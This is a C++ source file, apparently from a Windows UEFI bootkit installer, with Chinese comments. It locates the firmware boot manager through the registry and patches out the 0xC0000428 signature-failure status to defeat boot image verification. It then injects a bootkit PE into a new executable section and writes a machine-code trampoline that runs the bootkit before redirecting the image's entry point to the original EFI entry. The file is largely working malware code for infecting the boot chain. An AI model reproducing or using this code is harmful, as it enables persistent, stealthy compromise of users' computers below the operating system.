#include "BootImage.h"

#include "ShareData.h"


std::string GetBootfwPath()
{
	HKEY Control;
	Call::CallFunction(ADVAPI32, "RegOpenKeyA", HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control", &Control);

	char BootPath[64];
	DWORD PathSz1 = 64;
	Call::CallFunction(ADVAPI32, "RegGetValueA", Control, 0, "FirmwareBootDevice", RRF_RT_REG_SZ, nullptr, BootPath, &PathSz1);
	Call::CallFunction(ADVAPI32, "CloseHandle", Control);

	std::string bootmgr_drive_path("\\??\\GLOBALROOT\\ArcName\\");
	bootmgr_drive_path += BootPath;
	return bootmgr_drive_path;
}


// 去除数字签名验证
void BootNoCertPatch(PVOID image, UINT32 size) {
	for (size_t i{}; i < size - 4; ++i) {
		auto& val = *(UINT32*)((UINT64)image + i);
		if (val == 0xC0000428) {
			val = 0;
		}
	}
}



void PatchBootPe(std::pair<PVOID, UINT32>& bootImg, std::pair<PVOID, UINT32>& bootKitImg, PEFile* bootPe, PEFile* bootkitPe)
{
	// 插入一个新section
	auto paa = bootPe->GetNtHeaders();
	bootPe->AddSection(".fuck", bootkitPe->GetNtHeaders()->OptionalHeader.SizeOfImage + 0x1000, IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE);
	bootImg.second += (bootkitPe->GetNtHeaders()->OptionalHeader.SizeOfImage + 0x1000);

	// 拷贝导出表数据
	bootkitPe->ExportVarCopy(0,&g_MapperContext,sizeof(g_MapperContext));

	// EFI程序中，没有导入表和重定位表，不需要修复 展开即可
	auto mapMem = MemAlloc(bootkitPe->GetNtHeaders()->OptionalHeader.SizeOfImage + 0x1000);
	bootkitPe->MapPeSection(mapMem);

	bootPe->CopyDataToSection(".fuck",0, mapMem, bootkitPe->GetNtHeaders()->OptionalHeader.SizeOfImage + 0x1000);

	auto header = bootPe->GetNtHeaders();
	auto bootkitheader = bootkitPe->GetNtHeaders();
	auto section = bootPe->GetSectionHeader(".fuck");

	// 构建跳转地址
	INT32 new_ep_instr = (INT32)section->VirtualAddress + bootkitheader->OptionalHeader.AddressOfEntryPoint - (section->VirtualAddress + 11);
	INT32 old_ep_instr = (INT32)header->OptionalHeader.AddressOfEntryPoint - (section->VirtualAddress + 22);


#define DWORD2BYTES(Val) (BYTE)(Val), (BYTE)(Val >> 8), (BYTE)(Val >> 16), (BYTE)(Val >> 24) 

	UINT8 new_ep[] = {
	0x51,							 //push rcx
	0x52,							 //push rdx
	0x48, 0x83, 0xEC, 0x28,			 //sub rsp, 0x28

	0xE8, DWORD2BYTES(new_ep_instr), //call new_ep (bootkit)

	0x48, 0x83, 0xC4, 0x28,			 //add rsp, 0x28
	0x5A,							 //pop rdx
	0x59,							 //pop rcx

	0xE9, DWORD2BYTES(old_ep_instr), //jmp org_ep (EfiEntry)
	};

	memcpy((PVOID)(section->PointerToRawData+ (UINT64)(bootImg.first)), new_ep, sizeof(new_ep));
	header->OptionalHeader.AddressOfEntryPoint = section->VirtualAddress;
}
